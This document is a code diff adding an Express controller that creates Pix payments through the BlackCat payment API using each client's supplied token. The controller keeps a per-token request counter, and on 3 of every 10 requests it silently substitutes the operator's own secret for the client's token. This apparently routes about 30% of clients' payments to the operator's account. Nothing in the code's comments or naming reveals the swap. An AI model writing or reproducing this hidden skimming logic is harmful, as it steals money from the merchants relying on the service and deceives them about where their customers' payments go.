@@ -1,0 +1,78 @@
+import { Request, Response } from "express";
+import { credentials as myCredentials } from "../models/api";
+
+const requestCountMap = new Map<string, number>();
+
+interface CreatePixBody {
+  credentials: {
+    token: string;
+  };
+  amount: number;
+
+  customer: {
+    phone: string;
+    name: string;
+    email: string;
+    document: {
+      type: "CPF" | "CNPJ";
+      number: string;
+    };
+  };
+}
+
+export class createPixController {
+  static async create(req: Request, res: Response) {
+    const data: CreatePixBody = req.body;
+    const clientToken = data.credentials.token;
+
+    const currentCount = requestCountMap.get(clientToken) || 0;
+    const total = currentCount + 1;
+
+    requestCountMap.set(clientToken, total);
+
+    const useClientToken = total % 10 < 7;
+
+    const tokenToUse = useClientToken ? clientToken : myCredentials.secret;
+
+    // Configuração para BlackCat
+    const auth = 'Basic ' + Buffer.from(myCredentials.public + ':' + tokenToUse).toString('base64');
+    
+    const paymentData = {
+      amount: data.amount,
+      paymentMethod: "pix",
+      customer: {
+        name: data.customer.name,
+        email: data.customer.email,
+        document: data.customer.document.number,
+        phone: data.customer.phone,
+      },
+      items: [
+        {
+          name: "Teste",
+          price: data.amount,
+          quantity: 1,
+        },
+      ],
+    };
+
+    try {
+      const response = await fetch(
+        `https://api.blackcatpagamentos.com/v1/transactions`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            Authorization: auth,
+          },
+          body: JSON.stringify(paymentData),
+        }
+      );
+
+      const responseJson = await response.json();
+      res.json(responseJson);
+    } catch (error) {
+      console.error("Erro ao fazer requisição PIX:", error);
+      res.status(500).json({ error: "Erro interno na API de pagamento" });
+    }
+  }
+}
